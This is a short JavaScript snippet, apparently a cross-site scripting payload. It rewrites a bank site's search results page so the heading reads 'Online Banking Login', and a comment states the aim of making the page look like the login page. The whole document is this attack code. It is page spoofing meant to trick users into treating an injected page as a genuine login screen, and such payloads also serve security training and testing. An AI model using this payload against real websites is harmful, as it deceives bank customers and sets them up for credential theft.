
<!-- Clean the search page to make it look like the connection page -->
<script>
  var allElements = document.getElementsByTagName("*");
  var searchResultsH1;
  var nextElement;

  /* allElements.find(|elem| elem == "Search Results") */
  for (var i = 0; i < allElements.length; i++) {
    if (allElements[i].textContent == "Search Results") {
      searchResultsH1 = allElements[i];
      nextElement = allElements[++i];
    }
  }

  /* clean "Search Results" and "No results were found (...)" */
  searchResultsH1.innerHTML = "Online Banking Login";
  nextElement.innerHTML = "";
</script>
